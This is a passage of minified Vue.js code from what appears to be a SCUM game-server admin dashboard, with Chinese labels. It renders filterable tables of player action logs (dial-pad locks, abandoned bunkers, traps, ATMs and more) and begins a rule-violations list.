"),i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.transferInfo.deal.reality))])])])]:e._e(),t.otherConfig&&t.otherConfig.locations&&t.otherConfig.area?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("交易坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.area)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.locations}})],1)]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"943b77de",null),Ri=Fi.exports,Ei={name:"DialPad",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"开锁人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"开锁人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"开锁人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"对象物品名称",key:"targetName",dataIndex:"targetName",width:200,align:"center",scopedSlots:{customRender:"targetName"}},{title:"输入号码",key:"guessedCombination",dataIndex:"guessedCombination",width:180,align:"center",scopedSlots:{customRender:"guessedCombination"}},{title:"是否成功",key:"success",dataIndex:"success",width:80,align:"center",scopedSlots:{customRender:"success"}},{title:"开锁时长",key:"elapsedTime",dataIndex:"elapsedTime",width:100,align:"center",scopedSlots:{customRender:"elapsedTime"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"dialPad"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"dialPad"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},Pi=Ei,Ai=Object(S.a)(Pi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"targetName",fn:function(t){return[i("span",[e._v(e._s(t||"无数据"))])]}},{key:"guessedCombination",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(a.otherConfig&&a.otherConfig.guessedCombination?a.otherConfig.guessedCombination:"--"))])])]}},{key:"success",fn:function(t,a){return[i("a-tag",{attrs:{color:a.otherConfig&&void 0!==a.otherConfig.elapsedTime?"green":"red"}},[e._v(e._s(a.otherConfig&&void 0!==a.otherConfig.elapsedTime?"成功":"失败"))])]}},{key:"elapsedTime",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"darkyellow"}},[e._v(e._s(a.otherConfig&&a.otherConfig.elapsedTime?a.otherConfig.elapsedTime:"--"))]),e._v("s")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作者坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("触发坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.createdLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.createdArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.createdLocations}})],1),t.otherConfig&&void 0!==t.otherConfig.target?[i("div",{staticStyle:{width:"100%",height:"24px","margin-top":"10px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("锁坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("触发坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.target.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.target.area)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.target.locations}})],1)]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"5f1f60df",null),Di=Ai.exports,$i={name:"Abandon",data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"是否成功",key:"success",dataIndex:"success",width:80,align:"center",scopedSlots:{customRender:"success"}},{title:"开锁时长",key:"elapsedTime",dataIndex:"elapsedTime",width:100,align:"center",scopedSlots:{customRender:"elapsedTime"}},{title:"失败尝试次数",key:"failedAttempts",dataIndex:"failedAttempts",width:120,align:"center",scopedSlots:{customRender:"failedAttempts"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],selectedRowKeys:[]}},mounted:function(){this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"abandoned"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"abandoned"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))}}},Ui=$i,Ni=Object(S.a)(Ui,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"success",fn:function(t,a){return[i("a-tag",{attrs:{color:a.otherConfig&&!0===a.otherConfig.success?"green":"red"}},[e._v(e._s(a.otherConfig&&!0===a.otherConfig.success?"成功":"失败"))])]}},{key:"elapsedTime",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"darkyellow"}},[e._v(e._s(a.otherConfig&&a.otherConfig.elapsedTime?a.otherConfig.elapsedTime:"--"))]),e._v("s")])]}},{key:"failedAttempts",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"red"}},[e._v(e._s(a.otherConfig&&a.otherConfig.failedAttempts?a.otherConfig.failedAttempts:"--"))]),e._v("次")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"348b2f5e",null),Mi=Ni.exports,zi={name:"Actions",components:{Trap:Qt,LockPick:ii,Explosives:oi,Defusal:di,Flag:gi,BaseBuilding:vi,Chest:wi,ChangeName:_i,BankAtm:Ri,DialPad:Di,Abandoned:Mi},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{cleanLoading:!1,currentTab:"trap-record"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/actions-record",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"trap-record"})}),this.currentTab="trap-record")},methods:{cleanActionsRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/actionsRecordAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),i=e.currentTab,e.currentTab="",e.$nextTick((function(){e.currentTab=i}))),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Oi=zi,qi=Object(S.a)(Oi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"游戏行为记录列表"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("template",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},slot:"extra"},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空游戏行为记录列表吗"},on:{confirm:e.cleanActionsRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空游戏行为记录")])],1)],1):e._e()],2),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/actions-record",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"trap-record",attrs:{tab:"陷阱日志"}},["trap-record"===e.currentTab?i("Trap"):e._e()],1),i("a-tab-pane",{key:"lock-pick",attrs:{tab:"开锁日志"}},["lock-pick"===e.currentTab?i("LockPick"):e._e()],1),i("a-tab-pane",{key:"dial-pad",attrs:{tab:"密码锁日志"}},["dial-pad"===e.currentTab?i("DialPad"):e._e()],1),i("a-tab-pane",{key:"explosives",attrs:{tab:"抛掷物日志"}},["explosives"===e.currentTab?i("Explosives"):e._e()],1),i("a-tab-pane",{key:"defusal",attrs:{tab:"排爆日志"}},["defusal"===e.currentTab?i("Defusal"):e._e()],1),i("a-tab-pane",{key:"flag",attrs:{tab:"领地旗造毁日志"}},["flag"===e.currentTab?i("Flag"):e._e()],1),i("a-tab-pane",{key:"base-building",attrs:{tab:"领地旗占领日志"}},["base-building"===e.currentTab?i("BaseBuilding"):e._e()],1),i("a-tab-pane",{key:"chest",attrs:{tab:"挖埋箱子日志"}},["chest"===e.currentTab?i("Chest"):e._e()],1),i("a-tab-pane",{key:"change-name",attrs:{tab:"玩家更名日志"}},["change-name"===e.currentTab?i("ChangeName"):e._e()],1),i("a-tab-pane",{key:"bank-atm",attrs:{tab:"银行ATM日志"}},["bank-atm"===e.currentTab?i("BankAtm"):e._e()],1),i("a-tab-pane",{key:"abandoned",attrs:{tab:"废弃地堡日志"}},["abandoned"===e.currentTab?i("Abandoned"):e._e()],1)],1)],1)])],1)}),[],!1,null,"41be3142",null),Bi=qi.exports,Hi={name:"Violations",components:{MapLocations:J},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingViolationsListTable:!1,violationsListFilter:{tag:void 0,steamId:void 0,rawContent:void 0,timestampStart:void 0,timestampEnd:void 0},violationsListColumns:[{title:"违规类型标记",key:"tag",dataIndex:"tag",width:250,align:"center",scopedSlots:{customRender:"tag"}},{title:"Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"日志原文",key:"rawContent",dataIndex:"rawContent",width:180,align:"center",scopedSlots:{customRender:"rawContent"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],violationsListData:[],violationsListPagination:{pageSize:20,pageNum:1,total:0},expandedViolationsIds:[],tagList:$,lockTypeList:[{value:"basic",label:"基础",color:"green"},{value:"medium",label:"中等",color:"yellow"},{value:"advanced",label:"高级",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getViolationsList()},methods:{onViolationsListCleanFilter:function(){var e=this;this.violationsListPagination.pageNum=1,this.$nextTick((function(){e.getViolationsList(!0)}))},onViolationsListFilter:function(){var e=this;this.violationsListPagination.pageNum=1,this.$nextTick((function(){e.getViolationsList()}))},onChangeViolationsListPagination:function(e){var t=this;this.violationsListPagination.pageNum=e,this.$nextTick((function(){t.getViolationsList()}))},onShowSizeChangeViolationsListPagination:function(e,t){var i=this;this.violationsListPagination.pageNum=1,this.violationsListPagination.pageSize=t,this.$nextTick((function(){i.getViolationsList()}))},getViolationsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.violationsListPagination,n=a.pageNum,r=a.pageSize,e?(t.violationsListFilter={tag:void 0,steamId:void 0,rawContent:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 